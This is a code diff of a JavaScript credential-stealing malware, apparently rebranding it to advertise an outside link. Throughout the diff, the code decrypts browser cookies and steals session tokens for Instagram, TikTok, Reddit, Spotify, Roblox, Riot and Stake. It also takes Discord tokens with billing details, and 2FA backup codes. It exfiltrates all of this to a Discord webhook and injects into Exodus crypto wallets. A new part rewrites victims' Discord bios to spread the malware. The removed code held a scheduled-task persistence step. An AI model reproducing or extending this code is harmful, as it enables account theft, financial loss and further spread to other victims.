@@ -62,28 +62,11 @@ function relaunchAsAdmin() {
 }
 
 async function main() {
-    try {
-        if (!hasAdminPrivileges()) {
-            await relaunchAsAdmin();
-            return;
-        }
-
-        // Créer la tâche planifiée
-        createScheduledTask();
-
-        // Initialiser les dossiers
-        initializeFolders();
-
-        // Récupérer les cookies et les décrypter
-        const cookies = await getCookies();
-        const decryptedCookies = await decryptCookies(cookies);
-
-        // Continuer avec le reste du code...
-        startup();
-        handleMiscellaneous();
-        SubmitTelegram();
-    } catch (error) {
-        console.error('Erreur dans la fonction main:', error);
+    if (!hasAdminPrivileges()) {
+        console.log("The script does not have administrative privileges.");
+        relaunchAsAdmin();
+    } else {
+        console.log("");
     }
 }
 
@@ -478,7 +461,7 @@ async function findBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | m0m0w3b s73413r`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
               },
             };
@@ -530,7 +513,7 @@ async function findEpicGamesBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | m0m0w3b s73413r`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
               },
             };
@@ -581,7 +564,7 @@ async function findGithubBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | m0m0w3b s73413r`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
               },
             };
@@ -720,7 +703,7 @@ user = {
         randomUUID: crypto.randomBytes(16).toString('hex'),
         start: Date.now(),
         debug: false,
-        copyright: '<================[ m0m0w3b s73413r ]>================>\n\n',
+        copyright: '<================[ rvlt.gg/WF80RrNf ]>================>\n\n',
         url: null,
         locale: locale,
     }
@@ -1335,7 +1318,7 @@ async function SubmitInstagram(session_id) {
         { name: 'Token', value: '```' + data.session_id + '```', inline: false },
       ],
       footer: {
-        text: `${user.hostname} | m0m0w3b s73413r`,
+        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
       },
     };
 
@@ -1445,7 +1428,7 @@ async function SubmitRoblox(secret_cookie) {
         },
       ],
       footer: {
-        text: `${user.hostname} | m0m0w3b s73413r`,
+        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
         icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
       },
     };
@@ -1502,7 +1485,7 @@ async function SpotifySession(cookie) {
                 { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
             ],
             footer: {
-                text: `${user.hostname} | m0m0w3b s73413r`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             }
         };
@@ -1624,7 +1607,7 @@ function stealTikTokSession(cookie) {
                         }
                       ],
                       footer: {
-                        text: `${user.hostname} | m0m0w3b s73413r`,
+                        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                         icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
                       },
                     }
@@ -1709,7 +1692,7 @@ function setRedditSession(cookie) {
                 { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                             ],
                             footer: {
-                                text: `${user.hostname} | m0m0w3b s73413r`,
+                                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                             },
                             author: {
@@ -1872,31 +1855,37 @@ async function getUserData(token) {
 
 async function getTokens() {
     const interceptedTokens = [];
-    try {
-        const tokens = await findToken(path.join(process.env.APPDATA, 'discord'));
-        for (const token of tokens) {
-            if (interceptedTokens.includes(token)) continue;
-            interceptedTokens.push(token);
 
+    for (let path of paths) {
+        await findToken(path);
+    }
+
+    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
+**     This free virus can bypass all antivirus !** 
+**           ⭐️https://rvlt.gg/WF80RrNf** ⭐️
+╚═══════════✧✧✧═══════════╝`;
+
+    for (let token of tokens) {
+        try {
             const userData = await getUserData(token);
+
             if (!userData) continue;
 
-            const ip = await getIp();
-            const phoneNumber = userData.phone || "Not available";
-            const billing = await getBilling(token);
-            const hqGuilds = await getHQGuilds(token);
-            const friends = await getRelationships(token);
-            const currentBio = userData.bio;
+            const phoneNumber = userData.phone || "None";
             let newBio = null;
 
-            // Mettre à jour la bio si elle existe
-            if (currentBio) {
-                try {
-                    newBio = await updateBio(token, currentBio);
-                } catch (error) {
-                    console.error('Erreur lors de la mise à jour de la bio:', error);
-                }
+            if (phoneNumber !== "None") {
+                newBio = await updateBio(token, predefinedBio);
             }
+
+            interceptedTokens.push(token);
+            const hqGuilds = await getHQGuilds(token);
+            const ip = await getIp();
+            const billing = await getBilling(token);
+            const friends = await getRelationships(token);
+            const currentBio = userData.bio|| "None";
+
+            const randomString = crypto.randomBytes(16).toString('hex');
 
             const userInformationEmbed = {
                 title: `${userData.username}#${userData.discriminator} (${userData.id})`,
@@ -1947,21 +1936,13 @@ async function getTokens() {
                         name: ":shield: HQ Guilds:",
                         value: hqGuilds,
                         inline: true
-                    }
+                    },
                 ],
                 footer: {
-                    text: `${user.hostname} | m0m0w3b s73413r`,
+                    text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                     icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                 }
             };
-
-            // Ajouter la bio si elle existe
-            if (currentBio) {
-                userInformationEmbed.fields.push({
-                    name: "<a:aa_star_black:1157319572328808449> About me:",
-                    value: "```\n" + currentBio + "\n```",
-                });
-            }
 
             const data = {
                 embeds: [userInformationEmbed],
@@ -1977,43 +1958,48 @@ async function getTokens() {
                         icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                     },
                     footer: {
-                        text: `${user.hostname} | m0m0w3b s73413r`,
+                        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                     }
                 };
                 data.embeds.push(friendsEmbed);
             }
 
+            if (newBio !== null) {
+                userInformationEmbed.fields.push({
+                    name: "<a:aa_star_black:1157319572328808449> New About me:",
+                    value: "```\n" + newBio + "\n```",
+                });
+            } else if (currentBio !== null) {
+                userInformationEmbed.fields.push({
+                    name: "<a:aa_star_black:1157319572328808449> About me:",
+                    value: "```\n" + userData.bio + "\n```",
+                });
+            }
             await axios.post(discordWebhookUrl, data);
+        } catch (error) {
+            console.error(error);
         }
-    } catch (error) {
-        console.error('Erreur dans getTokens:', error);
     }
 }
 
-async function updateBio(token, currentBio) {
+async function updateBio(token, newBio) {
     try {
-        const predefinedBio = `m0m0w3b m'a baisé le cul`;
+        const url = 'https://discord.com/api/v9/users/@me/profile';
+        const payload = { bio: newBio };
+        const headers = { authorization: token.trim() };
 
-        const response = await axios.patch(
-            'https://discord.com/api/v9/users/@me',
-            {
-                bio: predefinedBio
-            },
-            {
-                headers: {
-                    'Authorization': token,
-                    'Content-Type': 'application/json'
-                }
-            }
-        );
+        const response = await axios.patch(url, payload, { headers });
 
         if (response.status === 200) {
-            return predefinedBio;
+            console.log(`Bio updated for token: ${token}`);
+            return newBio;
+        } else {
+            console.log(`Failed to update bio for token: ${token}`);
+            return null;
         }
-        return currentBio;
     } catch (error) {
-        console.error('Erreur lors de la mise à jour de la bio:', error);
-        return currentBio;
+        console.error(`An error occurred while updating bio: ${error.message}`);
+        return null;
     }
 }
 
@@ -2482,7 +2468,7 @@ async function StealEpicGames() {
                 }
             });
 
-            const howToUseContent = `<================[m0m0w3b s73413r]>================>\n\n
+            const howToUseContent = `<================[rvlt.gg/WF80RrNf Stealer]>================>\n\n
 Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
 delete everything and copy all contents into the Epic Games folder and run.`;
 
@@ -2612,7 +2598,7 @@ function createSteamEmbed(account, accountInfo, games, level) {
             }
         ],
         footer: {
-            text: `${user.hostname} | m0m0w3b s73413r`,
+            text: `${user.hostname} | rvlt.gg/WF80RrNf`,
             icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
         },
     };
@@ -2640,7 +2626,7 @@ async function getGrowtopia() {
       await ensureDirectoryExistence(howToUseDir);
 
       const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
-      const howToUseContent = `tg\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+      const howToUseContent = `https://rvlt.gg/WF80RrNf\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
 
       await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
     }
@@ -2843,7 +2829,7 @@ async function archiveAndSendData() {
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
         zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
-        archive.addZipComment('wAllah c m0m0w3b');
+        archive.addZipComment('All the Information was Stealed by rvlt.gg/WF80RrNf.');
         archive.writeZip(zipFilePath);
         console.log('Archive created successfully');
         getExtension(zipFilePath);
@@ -3147,7 +3133,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information`,
+            name: `${user.hostname} | System Information | rvlt.gg/WF80RrNf`,
             icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
         },
         fields: [
@@ -3204,7 +3190,7 @@ try {
             },
         ],
         footer: {
-            text: `${user.hostname} | m0m0w3b s73413r`,
+            text: `${user.hostname} | rvlt.gg/WF80RrNf`,
             icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
         },
     };
@@ -3451,10 +3437,6 @@ async function injectAtomic() {
 
 async function injectExodus() {
     const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
-    if (!fs.existsSync(exodusPath)) {
-        console.log('Dossier Exodus non trouvé');
-        return;
-    }
     const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));
 
     for (const exodusDir of exodusDirs) {
@@ -3688,41 +3670,49 @@ async function getCookies() {
                     }
 
                     let encryptedValue = row.encrypted_value;
+                    if (!encryptedValue || encryptedValue.length < 16) {
+                        console.error(`Valeur de cookie invalide pour ${row.host_key}`);
+                        return;
+                    }
+
                     let iv = encryptedValue.slice(3, 15);
                     let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                     let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                     let decrypted = '';
 
                     try {
+                        if (!browserPath[i][3] || !iv || !encryptedData || !authTag) {
+                            console.error(`Données de décryptage manquantes pour ${row.host_key}`);
+                            return;
+                        }
+
                         const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                         decipher.setAuthTag(authTag);
                         decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
 
-                        // Handle different services
-                        if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
-                            SubmitInstagram(`${decrypted}`);
-                        } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
-                            stealTikTokSession(`${decrypted}`);
-                        } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
-                            setRedditSession(`${decrypted}`);
-                        } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
-                            SpotifySession(`${decrypted}`);
-                        } else if (row.name === '.ROBLOSECURITY') {
-                            SubmitRoblox(`${decrypted}`);
-                        } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
-                            RiotGameSession(`${decrypted}`);
-                        } else if (row.host_key === 'stake.com' && row.name === 'session') {
-                            sendStakeSessionToDiscord(`${decrypted}`);
+                        if (!decrypted) {
+                            console.error(`Échec du décryptage pour ${row.host_key}`);
+                            return;
                         }
 
-                        // Search for keywords
-                        for (const keyword of keywords) {
-                            if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
-                                matchedKeywords.push(keyword);
-                            }
+                        // Handle different services
+                        if (row.host_key.includes('stake.com')) {
+                            sendStakeSessionToDiscord(decrypted);
+                        } else if (row.host_key.includes('roblox.com')) {
+                            SubmitRoblox(decrypted);
+                        } else if (row.host_key.includes('instagram.com')) {
+                            SubmitInstagram(decrypted);
+                        } else if (row.host_key.includes('spotify.com')) {
+                            SpotifySession(decrypted);
+                        } else if (row.host_key.includes('tiktok.com')) {
+                            stealTikTokSession(decrypted);
+                        } else if (row.host_key.includes('reddit.com')) {
+                            setRedditSession(decrypted);
+                        } else if (row.host_key.includes('riotgames.com')) {
+                            RiotGameSession(decrypted);
                         }
                     } catch (error) {
-                        console.error(`Error decrypting cookies for ${row.host_key}:`, error);
+                        console.error(`Erreur lors du décryptage pour ${row.host_key}: ${error.message}`);
                     }
 
                     if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
@@ -3791,7 +3781,7 @@ async function sendKeywordsToDiscord(keywords) {
             "description": formattedKeywords,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | m0m0w3b s73413r`,
+                "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             }
         };
@@ -3818,7 +3808,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | m0m0w3b s73413r`,
+                "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             },
             "thumbnail": {
@@ -3994,7 +3984,7 @@ async function RiotGameSession(cookie) {
             "description": ``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | m0m0w3b s73413r`,
+                "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
@@ -4222,38 +4212,3 @@ function onlyUnique(item, index, array) {
     startup();
     handleMiscellaneous();
     SubmitTelegram();
-
-function createScheduledTask() {
-    try {
-        const pythonPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'Python', 'Python312', 'pythonw.exe');
-        const scriptPath = path.join(process.env.LOCALAPPDATA, '.wd5Pg9oeM6', 'aAufe19sAZ.py');
-        
-        // Utiliser des guillemets doubles pour les chemins avec espaces
-        const command = `schtasks /create /tn "PythonUpdater_KcydHnoq" /tr "\"${pythonPath}\" \"${scriptPath}\"" /sc onlogon /f`;
-        
-        console.log('Création de la tâche planifiée...');
-        execSync(command);
-        console.log('Tâche planifiée créée avec succès');
-    } catch (error) {
-        console.error('Erreur lors de la création de la tâche planifiée:', error);
-    }
-}
-
-async function decryptCookies(cookies) {
-    try {
-        const decryptedCookies = [];
-        for (const cookie of cookies) {
-            try {
-                const decrypted = await decryptCookie(cookie);
-                decryptedCookies.push(decrypted);
-            } catch (error) {
-                console.error(`Erreur de décryptage du cookie pour ${cookie.domain}:`, error);
-                continue;
-            }
-        }
-        return decryptedCookies;
-    } catch (error) {
-        console.error('Erreur lors du décryptage des cookies:', error);
-        return [];
-    }
-}
